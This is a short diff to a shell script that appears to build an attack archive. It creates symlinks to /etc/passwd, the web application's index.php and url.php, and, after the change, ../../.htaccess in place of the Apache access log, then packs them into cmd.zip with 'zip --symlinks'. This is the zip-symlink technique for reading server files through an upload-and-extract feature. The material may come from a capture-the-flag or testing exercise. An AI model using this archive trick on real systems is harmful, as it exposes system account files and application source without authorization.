@@ -10,10 +10,10 @@ done
 ln -s /etc/passwd passwd
 ln -s ../../index.php index
 ln -s ../../url.php url
-ln -s /var/log/apache2/access.log accesslog
+ln -s ../../.htaccess htaccess
 
 # zip stuff
-zip --symlinks cmd.zip testfile.txt passwd index url accesslog
+zip --symlinks cmd.zip testfile.txt passwd index url htaccess
 
 # cleanup
-rm passwd index url accesslog testfile.txt
+rm passwd index url htaccess testfile.txt
